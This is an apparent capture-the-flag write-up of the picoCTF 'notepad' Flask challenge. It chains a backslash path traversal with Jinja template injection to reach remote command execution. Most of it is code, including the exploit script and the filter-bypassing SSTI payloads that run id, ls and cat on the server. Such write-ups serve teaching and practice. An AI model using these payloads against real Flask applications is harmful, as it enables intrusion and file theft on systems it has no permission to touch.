## Description
This note-taking site seems a bit off. notepad.mars.picoctf.net


## Solution
In this challnege we are provided with the setup environment and codes.
Let's take a look what we have:

```python
from werkzeug.urls import url_fix
from secrets import token_urlsafe
from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html", error=request.args.get("error"))

@app.route("/new", methods=["POST"])
def create():
    content = request.form.get("content", "")
    if "_" in content or "/" in content:
        return redirect(url_for("index", error="bad_content"))
    if len(content) > 512:
        return redirect(url_for("index", error="long_content", len=len(content)))
    name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
    with open(name, "w") as f:
        f.write(content)
    return redirect(name)
```
we know it's a flask application. let's check `index.html` file:

```html 
<!doctype html>
{% if error is not none %}
  <h3>
    error: {{ error }}
  </h3>
  {% include "errors/" + error + ".html" ignore missing %}
{% endif %}
<h2>make a new note</h2>
<form action="/new" method="POST">
  <textarea name="content"></textarea>
  <input type="submit">
</form>
```

Also it's using docker to setup environment:
```docker
FROM python:3.9.2-slim-buster

RUN pip install flask gunicorn --no-cache-dir

WORKDIR /app
COPY app.py flag.txt ./
COPY templates templates
RUN mkdir /app/static && \
    chmod -R 775 . && \
    chmod 1773 static templates/errors && \
    mv flag.txt flag-$(cat /proc/sys/kernel/random/uuid).txt

CMD ["gunicorn", "-w16", "-t5", "--graceful-timeout", "0", "-unobody", "-gnogroup", "-b0.0.0.0", "app:app"]
```

taking a look and python codes, it seem that we have control to write wherever we want to. cause of code below
```python
name = f"static/{url_fix(content[:128])}-{token_urlsafe(8)}.html"
with open(name, "w") as f:
    f.write(content)
```
It will use first 128 characters of our input content and set them as our filename and store it in `static` folder.
if we set content to `../templates/errors/test`, it will try to write our content to path below:
```
static/../templates/errors/test-<random8char>.html
````

But the problem is that `/` and `_` are filtered in input and we can't send these values in content field. as it will detect is as `bad_content`.
But there is a function `url_fix` which our input content is passed to this method and printed in screen.
let's take a look at this method:
```python
def url_fix(s, charset="utf-8"):
    r"""Sometimes you get an URL by a user that just isn't a real URL because
    it contains unsafe characters like ' ' and so on. This function can fix
    some of the problems in a similar way browsers handle data entered by the
    user:

    >>> url_fix(u'http://de.wikipedia.org/wiki/Elf (Begriffskl\xe4rung)')
    'http://de.wikipedia.org/wiki/Elf%20(Begriffskl%C3%A4rung)'

    :param s: the string with the URL to fix.
    :param charset: The target charset for the URL if the url was given as
                    unicode string.
    """
    # First step is to switch to unicode processing and to convert
    # backslashes (which are invalid in URLs anyways) to slashes.  This is
    # consistent with what Chrome does.
    s = to_unicode(s, charset, "replace").replace("\\", "/")

    # For the specific case that we look like a malformed windows URL
    # we want to fix this up manually:
    if s.startswith("file://") and s[7:8].isalpha() and s[8:10] in (":/", "|/"):
        s = "file:///" + s[7:]

    url = url_parse(s)
    path = url_quote(url.path, charset, safe="/%+$!*'(),")
    qs = url_quote_plus(url.query, charset, safe=":&%=+$!*'(),")
    anchor = url_quote_plus(url.fragment, charset, safe=":&%=+$!*'(),")
    return to_native(url_unparse((url.scheme, url.encode_netloc(), path, qs, anchor)))
```

It will replace `\` character with `/` in url. 
Great we now know that we can send our payload just by replace these values. so our payload will be like:
```
..\templates\errors\test
```

send it with curl:
```bash
$ curl -X POST "https://notepad.mars.picoctf.net/new" --data "content=..\templates\errors\test"

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="static/../templates/errors/test-wN0Eds1fEAI.html">static/../templates/errors/test-wN0Eds1fEAI.html</a>.  If not click the link.⏎      
```
It seem our file is created in `errors` folder. let's verify it's created:
```bash
$ curl -X GET "https://notepad.mars.picoctf.net/?error=test-wN0Eds1fEAI"
<!doctype html>

  <h3>
    error: test-wN0Eds1fEAI
  </h3>
  ..\templates\errors\test

<h2>make a new note</h2>
<form action="/new" method="POST">
  <textarea name="content"></textarea>
  <input type="submit">
</form>⏎ 
```

and you can see it's showing and content.
let's make a longer content (more than 128 which is our filename) and check again:
```python
payload = '..\\templates\\errors\\test' + (128-len('..\\templates\\errors\\test'))*'a' + 'this is our paylaod'
print(payload)

# ..\templates\errors\testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaathis is our paylaod
```
Now let's send this new payload:
```bash
$ curl -X POST "https://notepad.mars.picoctf.net/new" --data "content=..\templates\errors\testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaathis is our paylaod"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="static/../templates/errors/testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-Ymf7PoaVcmk.html">static/../templates/errors/testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-Ymf7PoaVcmk.html</a>.  If not click the link.⏎ 

$ curl -X GET "https://notepad.mars.picoctf.net/?error=testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-Ymf7PoaVcmk"
<!doctype html>

  <h3>
    error: testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-Ymf7PoaVcmk
  </h3>
  ..\templates\errors\testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaathis is our paylaod

<h2>make a new note</h2>
<form action="/new" method="POST">
  <textarea name="content"></textarea>
  <input type="submit">
</form>⏎ 
```
And you can see our payload is rendered here. Now we know we have access to write on server in `errors` path
and any template python code will be rendered here.
First let's make a simple python code to do this procedure:

```python
import sys
import requests

base_url = 'https://notepad.mars.picoctf.net'

payload_content = sys.argv[1]
path_content = '..\\templates\\errors\\test' + (128-len('..\\templates\\errors\\test'))*'a'
content = path_content + payload_content

response = requests.post(f'{base_url}/new', data={'content': content}, allow_redirects=False)
redirected_url = response.headers['Location']
filename = redirected_url.split('/')[-1]
print(f'[+] File created with name: {filename}')

# Now try to get the file with ?error param
response = requests.get(f'{base_url}/?error={filename.rstrip(".html")}')
print('[+] Printing content of file')
print(response.text.split('\n')[5].replace(path_content, '').strip())
```

This code will get our payload from command argument and make the filepath, post it as content, get response and show us.

Let's try to send a template code like `{{7*7}}` in our pyaload:

```bash
$ python solve.py "{{7*7}}"

[+] File created with name: testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-ONAzPSs9EOg.html
[+] Printing content of file
49
```

Ok, now we can keep going and try to read flag from server. But the problem is `_` is also disabled. 
The idea is to read flag.txt at a random location generated in docker setup.
Here is a ssti payload to execute `id` command:

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
But we can't pass this payload, cause of `_` is filtered and will get following result:
```bash
python solve.py "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
[+] File created with name: ?error=bad_content
```

There are some solutions to bypass this filtering, we use following steps:

1- convert to attr,getitem solution
```
{{request.application|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}
```

2- Now instead of using `_` send another param in url and send value `_` as `request.args` parameter like below:
```
?error=<filename>&c=_
```
and access this value in template using `request.args.c` and create for example `__class__` using this approach, by joining 2 of `request.args.c` plus string 'class' plus 2 of `request.args.c` lie: `(request.args.c*2,'class',request.args.c*2)`

So our finale payload will be like:
```
{{request.application|attr((request.args.c*2,'globals',request.args.c*2)|join)|attr((request.args.c*2,'getitem',request.args.c*2)|join)((request.args.c*2,'builtins',request.args.c*2)|join)|attr((request.args.c*2,'getitem',request.args.c*2)|join)((request.args.c*2,'import',request.args.c*2)|join)('os')|attr('popen')('id')|attr('read')()}}
```

Sending it to server:
```bash
$ python solve.py "{{request.application|attr((request.args.c*2,'globals',request.args.c*2)|join)|attr((request.args.c*2,'getitem',request.args.c*2)|join)((request.args.c*2,'builtins',request.args.c*2)|join)|attr((request.args.c*2,'getitem',request.args.c*2)|join)((request.args.c*2,'import',request.args.c*2)|join)('os')|attr('popen')('id')|attr('read')()}}"
[+] File created with name: testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-ysgpeWQqnYg.html
[+] Printing content of file
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```
And we have RCE, the final step is to read the flag. But first we should find it's name at `/app` location.
Let execute and `ls` command:

```bash
$ python solve.py "{{request.application|attr((request.args.c*2,'globals',request.args.c*2)|join)|attr((request.args.c*2,'getitem',request.args.c*2)|join)((request.args.c*2,'builtins',request.args.c*2)|join)|attr((request.args.c*2,'getitem',request.args.c*2)|join)((request.args.c*2,'import',request.args.c*2)|join)('os')|attr('popen')('ls')|attr('read')()}}"
[+] File created with name: testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-MP6ZKx_2F1U.html
[+] Printing content of file
<!doctype html>

  <h3>
    error: testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-MP6ZKx_2F1U
  </h3>
  ..\templates\errors\testaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaapp.py
flag-c8f5526c-4122-4578-96de-d7dd27193798.txt
static
templates

```
as you can see `flag` is located in file `flag-c8f5526c-4122-4578-96de-d7dd27193798.txt`. lets read it:
```bash
$ python solve.py "{{request.application|attr((request.args.c*2,'globals',request.args.c*2)|join)|attr((request.args.c*2,'getitem',request.args.c*2)|join)((request.args.c*2,'builtins',request.args.c*2)|join)|attr((request.args.c*2,'getitem',request.args.c*2)|join)((request.args.c*2,'import',request.args.c*2)|join)('os')|attr('popen')('cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt')|attr('read')()}}"
[+] File created with name: ?error=long_content&len=514
```
And as you can see we got to the max length filtering. A simple way is to send another request.get param and send our shell payload for it with `request.args.shell`. 
So we update python code like below:
```python
import sys
import requests

base_url = 'https://notepad.mars.picoctf.net'

payload_content = sys.argv[1]
path_content = '..\\templates\\errors\\test' + (128-len('..\\templates\\errors\\test'))*'a'
content = path_content + payload_content
shell = sys.argv[2]

response = requests.post(f'{base_url}/new', data={'content': content}, allow_redirects=False)
redirected_url = response.headers['Location']
filename = redirected_url.split('/')[-1]
print(f'[+] File created with name: {filename}')

# Now try to get the file with ?error param
response = requests.get(f'''{base_url}/?error={filename.rstrip(".html")}&c=_&shell={shell}''')
print('[+] Printing content of file')
print(response.text)
```
and run it with `shell equal 'cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt'`:
```bash
$ python solve.py "{{request.application|attr((request.args.c*2,'globals',request.args.c*2)|join)|attr((request.args.c*2,'getitem',request.args.c*2)|join)((request.args.c*2,'builtins',request.args.c*2)|join)|attr((request.args.c*2,'getitem',request.args.c*2)|join)((request.args.c*2,'import',request.args.c*2)|join)('os')|attr('popen')(request.args.shell)|attr('read')()}}" "cat flag-c8f5526c-4122-4578-96de-d7dd27193798.txt"
```
And we get the flag.